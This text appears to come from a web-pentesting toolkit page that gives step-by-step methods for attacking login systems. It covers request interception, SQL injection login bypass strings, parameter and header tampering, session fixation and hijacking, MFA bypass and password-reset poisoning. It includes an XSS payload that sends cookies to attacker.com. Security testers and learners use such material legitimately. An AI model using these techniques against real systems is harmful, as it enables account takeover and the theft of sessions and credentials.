📡 How to Intercept Login Requests

Before you can attack an authentication system, you need to capture the login request. This guide covers Burp Suite, browser DevTools, and curl — step by step.

🔴 Burp Suite (Best)
🔵 Browser DevTools
⚫ Curl + Wireshark
🟢 mitmproxy
✓ Recommended: Burp Suite Community Edition is free and the industry standard for intercepting web requests. Download from portswigger.net/burp/communitydownload
📥 Burp Suite Setup — Step by Step
1
Install & Launch Burp Suite
Download Burp Suite Community from portswigger.net. Launch and select "Temporary project" → "Use Burp defaults" → "Start Burp".
2
Configure Browser Proxy
Burp listens on 127.0.0.1:8080 by default. Set your browser proxy to this address.

Firefox: Settings → Network Settings → Manual proxy → HTTP Proxy: 127.0.0.1, Port: 8080
Chrome: Use FoxyProxy extension or system proxy settings.
3
Install Burp CA Certificate
Browse to http://burpsuite in your proxied browser → Download CA certificate → Import into browser's certificate store. This allows intercepting HTTPS.
4
Enable Interception
In Burp: Proxy tab → Intercept tab → Click "Intercept is off" to toggle it ON (button turns orange).
5
Submit the Login Form
Go to the target login page in your browser. Fill in username/password and click Login. Burp will freeze the request.
6
Copy the Raw Request
In Burp, right-click the intercepted request → "Copy to clipboard" OR select all text in the request panel. This is your raw HTTP request to paste into the Request Parser.
7
Forward or Drop
Click "Forward" to let the request through (normal login), or "Drop" to discard it. Turn Intercept OFF after capturing to resume normal browsing.
💡 Pro Tips — Burp Tricks
Right-click → Send to Repeater
Replay modified requests without intercepting again — best for manual testing
Right-click → Send to Intruder
Mark parameters with §§ and automate fuzzing with a wordlist — perfect for brute force
HTTP History tab (Proxy)
See ALL requests without enabling intercept — less disruptive for browsing
Target → Site Map
Auto-maps all endpoints seen during browsing — discover hidden login pages
Comparer tab
Compare two responses byte-by-byte — detect subtle differences in boolean blind tests
🔵 Browser DevTools — Network Tab
1
Open DevTools
Press F12 or Ctrl+Shift+I → Click "Network" tab.
2
Check "Preserve log"
Enable "Preserve log" checkbox so requests aren't cleared on page navigation/redirect.
3
Submit Login
Fill in credentials and submit the form. Watch the Network tab fill with requests.
4
Find the Login Request
Look for a POST request to /login, /auth, /signin, /api/auth/login etc. Click it.
5
Copy as cURL
Right-click the request → "Copy" → "Copy as cURL (bash)". This gives you a full curl command with all headers. Paste into terminal to replay.
Limitation: DevTools doesn't let you modify requests before they're sent. For injection testing use Burp Suite. DevTools is great for capturing the initial request structure.
⚫ Capture with curl + View Structure
Method: Use curl with verbose mode to see the exact request/response structure, then replicate/modify as needed.
# Basic POST login with curl — verbose shows full request curl -v -X POST https://target.com/login \ -H "Content-Type: application/x-www-form-urlencoded" \ --data "username=admin&password=test123" \ -c cookies.txt -b cookies.txt # JSON login curl -v -X POST https://target.com/api/login \ -H "Content-Type: application/json" \ -d '{"username":"admin","password":"test123"}' # Save response + headers to file curl -v -X POST https://target.com/login \ --data "username=admin&password=test" \ -D response_headers.txt \ -o response_body.html 2>&1 | tee full_capture.txt

💉 SQL Injection Login Bypass

Inject SQL into login fields to manipulate the underlying query logic and authenticate without valid credentials.

Why it works: When user input is inserted directly into a SQL query without parameterization, injected syntax changes the query's logic. SELECT * FROM users WHERE username='INPUT' becomes exploitable.
① Basics
② Payloads
③ Injection Contexts
④ WAF Bypass
⑤ Guided Guide
1
Find the Injection Point
Test each field with a single quote '. A SQL error, blank page, or different response = injectable.
2
Understand the Query Structure
Common login query: SELECT * FROM users WHERE username='INPUT' AND password='INPUT2'
Your goal: make the WHERE clause always return true, or comment out the password check.
3
Choose Your Bypass Strategy
A) Comment out password: admin'-- - → removes AND password=... check
B) OR bypass: ' OR 1=1-- - → makes WHERE always true
C) Close and subvert: ' OR '1'='1 → always-true string comparison
4
Test Comment Styles
MySQL: -- - or #  |  MSSQL: --  |  Oracle: --  |  PostgreSQL: --
5
Handle Parentheses
If standard payloads fail, the query may use parens: WHERE (username='X' AND active=1). Try: admin')-- -
Username Field Payloads
Password Field Payloads
Numeric Context (no quotes needed)
Query: WHERE username='X' AND password='Y'
Query: WHERE id=X (numeric)
Query: WHERE (username='X' AND pass='Y')
Query: WHERE username="X" (double quote)
WAF Detection: If standard payloads return 403 or "blocked", a WAF is filtering. These techniques bypass common WAF rules.

🔧 Parameter Manipulation Attacks

Manipulate request parameters to escalate privileges, skip authentication, or confuse backend parsers.

① Auth Param Manip
② Missing Params
③ Param Pollution
④ JSON/Array Tricks
1
Intercept the Authentication Response
Capture the login response with Burp Suite. Look for parameters like role, isAdmin, access_level, permissions.
2
Identify Trust Boundaries
The bug: server reads role/admin status from request params that the client controls, rather than from the database. Common in poorly designed APIs.
3
Modify the Parameter
In Burp Repeater, change the value and resend. Watch if the response changes or if you get access to admin functionality.
Common Privilege Escalation Parameters
1
Capture the Login Request
Get the full POST body of the login request.
2
Remove Parameters One at a Time
Delete password, then username, then other fields. Resend after each removal. Some backends skip validation when a required field is absent.
3
Test Empty Values
Send password= (empty) instead of removing entirely. Some systems auth with empty password if the DB has an empty hash.
Missing Parameter Variants to Test
1
Understand HTTP Parameter Pollution (HPP)
Different frameworks parse duplicate parameters differently. PHP uses the last value, Express/Node uses an array, ASP.NET uses the first. Send two values for the same parameter and exploit the inconsistency.
2
Inject Duplicate Parameters
Add the same parameter twice with different values: username=admin&username=attacker. The backend may check the second while using the first for auth.
3
Mix GET and POST
In some frameworks, adding a parameter in the URL query string while it's also in the POST body causes confusion: POST /login?admin=true with body username=user&password=pass
Parameter Pollution Payloads
1
Change String to Array
If the body is JSON, change "username":"admin" to "username":["admin","attacker"]. Some backends use the first element for DB query but the second for logging.
2
Inject Type Confusion
Change password from string to true or null. Weak type-checking in PHP or JavaScript may evaluate these as truthy/matching.

🌐 HTTP Request Manipulation Attacks

Manipulate HTTP methods, headers, and the Host header to bypass authentication logic that relies on request metadata.

① Verb Tampering
② Header Injection
③ Host Header
1
Why HTTP Verb Tampering Works
Access controls are often configured per-method. A rule blocking POST /admin may not block GET /admin or HEAD /admin.
2
In Burp: Change the Method
Intercept the request → Right-click → "Change request method" to switch POST↔GET. Or manually edit the method field.
3
Test Unusual Methods
Try HEAD (server processes but returns no body), OPTIONS, PUT, PATCH, DELETE, CONNECT.
Verb Tampering Commands
1
Why Header Injection Works
Apps that trust certain headers for access control can be bypassed by adding those headers. Common: X-Forwarded-For, X-Real-IP, X-Original-IP — apps that whitelist 127.0.0.1 for admin access are bypassed by faking this header.
2
Add Headers in Burp
In Repeater, click after the last header, press Enter twice to start body, or click before the blank line to add headers. Add: X-Forwarded-For: 127.0.0.1
Auth-Bypass Headers to Inject
1
Host Header Injection for Auth Bypass
Password reset links often use the Host header to construct the reset URL: https://HOST/reset?token=xyz. If you control the Host header, the reset link is sent to your server.
2
Burp Collaborator Method
Use Burp Collaborator → get a unique subdomain (e.g. abc123.burpcollaborator.net) → inject it as Host header in the password reset request → check Collaborator for DNS/HTTP callbacks containing the token.

🧠 Authentication Logic Flaws

Exploit incorrect logical checks, client-side controls, step skipping, and broken state machines in multi-step authentication flows.

① Auth Logic Flaw
② Client-Side Auth
③ Step Skipping
④ State Machine
1
Identify the Auth Logic
Look for: response checking both username AND password, but the code has an OR instead of AND. Or: successful validation returns a value that equals false in PHP's loose comparison.
2
Test Edge Cases
Try: empty password, null values, very long inputs, special chars like %00, arrays instead of strings, type confusion.
3
PHP Loose Comparison Exploits
PHP's == does type juggling. "0e123" == "0e456" is TRUE (both are 0^exp = 0). Submit a password whose MD5 starts with 0e to bypass hash comparison.
Logic Flaw Payloads
1
Check the JavaScript Source
Press F12 → Sources tab. Look for authentication logic in JS files. Search for: password, login, auth, validate, checkAdmin.
2
Identify Client-Side Checks
If login validation happens in JS (comparing password to a hardcoded value, checking role from localStorage, etc.) — bypass it by modifying the JS or calling the protected function directly from DevTools console.
3
Override via DevTools Console
Open console, call the protected function directly: adminPanel() or set variables: window.isLoggedIn = true; window.role = 'admin'
Client-Side Bypass Techniques
1
Map the Multi-Step Flow
Login flows often have: Step 1 = username → Step 2 = password → Step 3 = MFA → Step 4 = dashboard. Each step usually has its own URL.
2
Skip Directly to Later Steps
After completing Step 1, try navigating directly to Step 3's or Step 4's URL without completing Step 2. If the server doesn't verify previous steps, you may bypass them.
3
Replay Step 2 Submissions
Complete Step 2 successfully once. Now replay that exact request (Burp Repeater) with a different username — the server may grant access to another account.
Step Skipping Attack Patterns
1
Understand the State Machine
Multi-step logins are state machines: UNAUTHENTICATED → USERNAME_VERIFIED → AUTHENTICATED. Server should track state server-side. If state is tracked via client-side data (cookie, param), you can manipulate it.
2
Manipulate State Parameters
Look for cookies or params like step=2, state=verified, auth_stage=password. Modify to jump states.
State Machine Attack Payloads

🍪 Session Attacks

Exploit session management weaknesses: fixation, hijacking, predictable IDs, and replay attacks.

① Session Fixation
② Session Hijacking
③ Predictable IDs
④ Session Replay
1
Get a Pre-Login Session ID
Visit the site before logging in. Note the session cookie value (e.g. PHPSESSID=abc123).
2
Force the Victim to Use Your Session
Send victim a link with your session ID embedded: https://target.com/login?PHPSESSID=abc123 or via Set-Cookie injection in MITM scenario.
3
Wait for Victim to Authenticate
When victim logs in with the fixed session ID, your session ID becomes authenticated. Use PHPSESSID=abc123 to access their account.
4
Test if Server Regenerates Session on Login
A secure app regenerates the session ID after authentication. If your pre-login ID remains the same after login = vulnerable to fixation.
Session Fixation Test Commands
1
Find the Session Cookie
In Burp HTTP history, look at requests for the session cookie name. Common: PHPSESSID, JSESSIONID, session, token, auth.
2
Steal via XSS (If Available)
Inject: <script>fetch('https://attacker.com/?c='+document.cookie)</script> to exfiltrate cookies if HttpOnly flag is NOT set.
3
Use Stolen Cookie
In Burp: set the cookie header to the stolen value. In curl: curl -b "PHPSESSID=stolenvalue" https://target.com/dashboard
Session Hijacking Commands
1
Collect Multiple Session IDs
Make multiple requests to the login page without authenticating. Collect 10-20 session IDs. Look for patterns: incrementing numbers, timestamps, short length.
2
Analyze with Sequencer
In Burp → Sequencer tab → Load samples → Analyze entropy. Low entropy = predictable = exploitable.
3
Brute Force the Session Space
If session IDs are short or follow a pattern, enumerate them with ffuf/burp intruder against the authenticated endpoint.
Predictable Session Enumeration
1
Capture an Authenticated Request
Make a legitimate authenticated request. Copy the full request with Burp (including session cookie + any CSRF tokens).
2
Replay After Session Should Expire
Log out, then replay the captured request. If the session wasn't properly invalidated server-side, the old session still works.
3
Test Session Invalidation on Password Change
Change account password, then try to use old session token. Should be invalidated — often isn't.

📱 Multi-Factor Authentication Bypass

Bypass OTP codes, exploit race conditions, reuse codes, and skip MFA steps entirely.

① OTP Brute Force
② OTP Reuse
③ Race Condition
④ MFA Step Skip
1
Check for Rate Limiting
Submit wrong OTPs and count: does the app lock after N attempts? Does it reset with a new session? If no rate limit = brute-forceable.
2
6-Digit OTP Space: 1,000,000 codes
4-digit = 10,000 codes. 6-digit = 1,000,000 codes. TOTP 6-digit is time-based (30s window) so you have ~1-2 codes valid at once. SMS codes may last longer.
3
Generate OTP Wordlist + Attack
Generate all N-digit numeric codes and use ffuf/Burp Intruder to enumerate them.
OTP Brute Force Commands
1
Use a Valid OTP
Complete MFA with a valid code. Note the exact code used and the request in Burp.
2
Replay the OTP Request
Log out. Initiate login again. In Burp Repeater, send the OTP request with the same code. If the server doesn't mark OTPs as used after first use = vulnerable.
3
Test Cross-Account OTP Reuse
Use your own valid OTP for someone else's MFA prompt. Some systems only validate the OTP format, not which account it belongs to.
OTP Reuse Test Vectors
1
Understand the Race Condition
OTP validation is: check OTP → mark as used → grant access. If "check" and "mark" aren't atomic, sending two requests simultaneously may result in both being validated before either is marked used.
2
Use Burp Turbo Intruder
Send the same OTP request to Turbo Intruder with the "race" script. It sends 20+ requests simultaneously in a single TCP connection burst, maximizing the race window.
Race Condition Attack Commands
1
Complete Step 1 (username/password)
Submit credentials. Note you're now at the MFA step URL.
2
Directly Navigate to Protected Resource
Instead of completing MFA, navigate directly to: /dashboard, /account, /api/profile. If server only checks "is password verified" without "is MFA verified" = bypass.
3
Manipulate the Auth State Cookie
Look for a cookie value that tracks auth stage like mfa_pending=true. Change to mfa_pending=false or mfa_verified=true.

🔄 Password Reset Attacks

Exploit token prediction, host header poisoning, link manipulation, and IDOR in password reset flows.

① Token Prediction
② Reset Poisoning
③ Link Manipulation
④ IDOR Reset
1
Request Multiple Reset Tokens for Your Own Account
Request 5-10 password reset emails for your account at different times. Collect all tokens from the emails.
2
Analyze Token Structure
Look for: timestamp-based tokens, sequential numbers, short tokens (4-8 hex chars), tokens based on username+timestamp MD5.
3
Enumerate If Predictable
If token follows a pattern, enumerate the token space around your known good token to find ones generated for other users.
Token Analysis & Enumeration
1
Intercept the Password Reset Request
Submit a password reset for the victim account (admin@target.com). Intercept in Burp before it's sent.
2
Poison the Host Header
Change Host: target.com to Host: attacker.com. The server generates the reset link using your supplied host: https://attacker.com/reset?token=xyz
3
Receive the Token
The victim receives an email with your attacker domain link. When they click it (or if you have a server to catch the request), you capture the valid reset token.
Host Header Poisoning Commands
1
Get a Valid Reset Link for Yourself
Request a password reset for your own account. Get the full reset URL from the email.
2
Manipulate the URL Parameters
Look for a user ID, email, or username in the URL. Change it to the target's value: /reset?token=abc&user=your_id → change user to admin's ID.
3
Test Token Reuse Across Users
Try using your own valid token but with a different user parameter. If the server only validates the token format, not the user-token binding = account takeover.
Reset Link Manipulation Patterns
1
Find User IDs in Reset Flow
Sometimes the "change password" endpoint directly takes a user ID parameter: POST /api/users/123/password
2
Change Your Own Password Using the API
First test with your own account ID 123 → succeeds. Then change ID to another user's ID (e.g. 1 for admin).
